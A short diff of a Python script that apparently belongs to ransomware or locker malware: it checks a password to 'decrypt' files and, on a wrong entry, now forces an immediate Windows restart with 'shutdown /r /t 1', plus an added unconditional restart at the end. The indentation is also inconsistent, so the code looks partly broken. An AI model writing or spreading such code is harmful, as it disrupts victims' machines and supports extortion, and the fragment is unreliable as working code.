@@ -211,6 +211,7 @@ if userInput == password:
 	print("Your files are decrypted!")
 
 else:
-	print("Restart your PC")
-	
-  ctypes.windll.user32.MessageBoxW(0, "Restart your PC", "YourAcutie.TXT", 16)
+	print("Restarting your PC")
+	os.system("shutdown /r /t 1")	
+  ctypes.windll.user32.MessageBoxW(0, "Restarting your PC", "Computer", 16)
+os.system("shutdown /r /t 1")
